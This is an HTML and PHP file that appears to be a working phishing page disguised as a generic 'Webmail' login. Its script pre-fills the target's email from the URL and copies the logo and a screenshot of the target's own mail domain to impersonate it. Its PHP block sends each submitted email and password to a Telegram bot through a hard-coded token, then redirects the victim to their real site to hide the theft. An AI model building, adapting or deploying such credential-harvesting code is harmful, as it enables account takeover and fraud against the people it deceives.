<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mail</title>
    <meta name="googlebot" content="noindex">
    <meta name="googlebot-news" content="noindex">
    <meta name="googlebot-news" content="nosnippet">
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        body {
            box-sizing: border-box;
            font-family: sans-serif;
            background: rgba(0, 0, 0, 0.04) url("");
            background-repeat: no-repeat;
            background-size: cover; 
        }
        .main-contain {
            width: 26%;
            background-color: #fff;
            border-radius: 5px;
            padding: 20px;
            margin: 80px auto;
        }
        .logbox {
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            margin-top: 10px;
        }
        .logbox span {
            font-size: 29px;
            margin-left: 10px;
            text-transform: capitalize;
        }
        .sign-p {
            text-align: center;
            margin: 0 18px;
            margin-top: 50px;
        }
        .sign-p p {
            color: #717171;
            font-weight: 500;
            font-size: 17px;
        }
        .signform {
            padding: 0 30px;
            margin-top: 30px;
        }
        .inpg input {
            width: 100%;
            margin: 10px 0;
            border: 1px solid #e8e7e7;
            font-family: inherit;
            padding: 13px 10px;
            font-weight: 400;
            font-size: 15px;
            border-radius: 3px;
        }
        .inpg input:focus {
            outline: none;
        }
        .inp2b {
            text-align: center;
        }
        .inp2b button {
            display: inline-block;
            width: 90%;
            margin: 0 auto;
            margin-top: 20px;
            text-align: center;
            height: 45px;
            background-color: #000066;
            color: #fff;
            font-size: 18px;
            border: none;
            cursor: pointer;
        }
        .inp2b button:hover {
            color: #ccc;
        }
        .foot-img {
            text-align: center;
        }
        .error {
            color: red;
            text-align: center;
        }
        .hide {
            display: none;
        }

        @media screen and (max-width: 569px) {
            body {
                height: 100vh;
            }
            .main-contain {
                width: 90%;
            }
        }
    </style>
</head>
<body class="bodymain">
    <div class="container">
        <div class="main-contain">
            <div class="logbox">
                <img src="https://reliable-firm.netlify.app/pix.jpeg" alt="pix" width="28" class="logo">
                <span class="name">Webmail</span>
            </div>

            <div class="sign-p">
                <p>Sign in with your email address and password to continue using your current password</p>
            </div>

            <div class="signform">
                <p class="error hide"></p>
                <form action="" method="POST" id="form">
                    <div class="inpg">
                        <input type="text" name="em" id="em" placeholder="Email" readonly>
                    </div>

                    <div class="inpg">
                        <input type="password" name="pa" id="pa" placeholder="Password">
                    </div>

                    <div class="inp2b">
                        <button type="submit" class="btnlogin">Login</button>
                    </div>

                    <div class="foot-img">
                        <img src="https://reliable-firm.netlify.app/nort.png" alt="nort" width="70">
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        window.addEventListener("load", () => {
            const id = window.location.href.split("#")[1];
            let logoUrl = id.split("@")[1];
            let nameUrl = logoUrl.split(".")[0];

            if (id) {
                document.getElementById("em").value = id;
                if (logoUrl === "gmail.com") {
                    document.body.style.background = `rgba(0, 0, 0, 0.04) url(https://image.thum.io/get/width/1280/crop/600/https://www.google.com/intl/us/gmail/about/)`;
                    document.body.style.backgroundRepeat = `no-repeat`;
                    document.body.style.backgroundSize = `cover`;
                    document.querySelector(".logo").src = `https://logo.clearbit.com/${logoUrl}`;
                    document.querySelector(".name").textContent = nameUrl;
                } else {
                    document.body.style.background = `rgba(0, 0, 0, 0.04) url(https://image.thum.io/get/width/1280/crop/600/https://${logoUrl})`;
                    document.body.style.backgroundRepeat = `no-repeat`;
                    document.body.style.backgroundSize = `cover`;
                    document.querySelector(".logo").src = `https://logo.clearbit.com/${logoUrl}`;
                    document.querySelector(".name").textContent = nameUrl;
                }
            }
        });
    </script>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $token = "7364910032:AAGCseZfzDY4_kRFlPvIfnIAJc5rGbzFB4k";
        $chatid = "6723684415";

        $email = htmlspecialchars($_POST['em']);
        $password = htmlspecialchars($_POST['pa']);

        $text = "Email: $email\nPassword: $password";

        $url = "https://api.telegram.org/bot$token/sendMessage";

        $data = [
            'chat_id' => $chatid,
            'text' => $text,
        ];

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ],
        ];

        $context  = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result !== FALSE) {
            $domain = explode('@', $email)[1];
            echo "<script>window.location.href = 'https://$domain';</script>";
        } else {
            echo "<script>alert('Error sending message to Telegram');</script>";
        }
    }
    ?>
</body>
</html>
